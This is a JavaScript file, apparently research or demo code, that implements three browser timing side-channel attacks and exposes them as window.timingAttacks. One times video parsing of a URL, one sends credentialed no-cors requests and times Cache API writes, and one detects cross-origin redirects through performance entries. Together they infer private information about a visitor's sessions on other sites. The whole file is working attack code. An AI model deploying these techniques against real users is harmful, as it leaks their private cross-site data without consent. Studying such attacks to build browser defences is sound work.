(function() {
	function videoParsingAttack(url, updateStatus) {
		var timeout = 3000;
		return new Promise(function(resolve, reject) {
			updateStatus('Collecting measurements for ' + (timeout/1000) + ' seconds');
			var measurements = [];
			var attackStart = window.performance.now();
			setTimeout(function() {
				updateStatus('Obtained ' + measurements.length + ' measurements');
				resolve(median(measurements));
			}, timeout);
			(function getMeasurement() {
				var v = document.createElement('video');
				var start;
				v.addEventListener('suspend', function() {
					start = window.performance.now();
				});
				v.addEventListener('error', function() {
					var end = window.performance.now();
					measurements.push(end - start);
					if (end - attackStart < timeout) {
						getMeasurement();
					}
				});
				v.src = url;
			})();
		});
	}

	function cacheStorageAttack(url, updateStatus) {
		function putInCache(response) {
			return new Promise(function(resolve) {
				var bogusReq = new Request('foo');
				caches.open('cache-storage-attack').then(function(cache) {
					var start = window.performance.now();
					cache.put(bogusReq, response.clone()).then(function() {
						return cache.delete(bogusReq);
					}).then(function() {
						resolve(window.performance.now() - start);
					});
				});
			});
		}
		return new Promise(function(resolve, reject) {
			if (!window.hasOwnProperty('caches')) {
				reject('Cache API is not supported.');
			}
			if (!window.hasOwnProperty('fetch')) {
				reject('Fetch API is not supported.');
			}
			var timeout = 2000;
			var measurements = [];
			fetch(url, {mode: 'no-cors', credentials: 'include'}).then(function(response) {
				// make sure that resource is fully downloaded
				putInCache(response).then(function(x) {
					updateStatus('Resource downloaded');
					var attackStart = window.performance.now();
					var callback = function(measurement) {
						measurements.push(measurement);
						if (window.performance.now() - attackStart < timeout) {
							putInCache(response).then(callback);
						}
						else {
							updateStatus('Obtained ' + measurements.length + ' measurements, only using median')
							resolve(median(measurements));
						}
					}
					putInCache(response).then(callback);
				});
			});
		});
	}

	function hasRedirect(url, updateStatus) {
		return new Promise(function(resolve, reject) {
			var start = window.performance.now();
			var numAlready = performance.getEntriesByName(url).length;
			fetch(url, {mode: 'no-cors', credentials: 'include'}).then(function() {
				updateStatus('First bytes of response received');
				var timeout = setTimeout(function() {
					clearInterval(interval);
					reject('resource timed out after 10 seconds');
				}, 10000);
				var interval = setInterval(function() {
					if (performance.getEntriesByName(url).length > numAlready) {
						clearInterval(interval);
						clearTimeout(timeout);
						var entries = performance.getEntriesByName(url);
						var fetchStart = entries[entries.length-1].fetchStart;
						updateStatus('Time between actual start and fetchStart: ' + (fetchStart - start));
						resolve(Math.abs(fetchStart - start) > 10);
					}
				}, 1);
			});
		});
	}

	function median(values) {
		values.sort( function(a,b) {return a - b;} );
		var half = Math.floor(values.length/2);
		if(values.length % 2)
			return values[half];
		else
			return (values[half-1] + values[half]) / 2.0;
	}

	hasRedirect.canRun = function() {
		return window.hasOwnProperty('performance') && window.performance.getEntriesByName;
	}
	cacheStorageAttack.canRun = function() {
		return window.hasOwnProperty('caches') && window.hasOwnProperty('fetch');
	};
	videoParsingAttack.canRun = function() {
		return navigator.userAgent.indexOf('Chrome') !== -1;
	}

	window.timingAttacks = {
		'hasRedirect': hasRedirect,
		'cacheStorage': cacheStorageAttack,
		'videoParsing': videoParsingAttack
	}
})();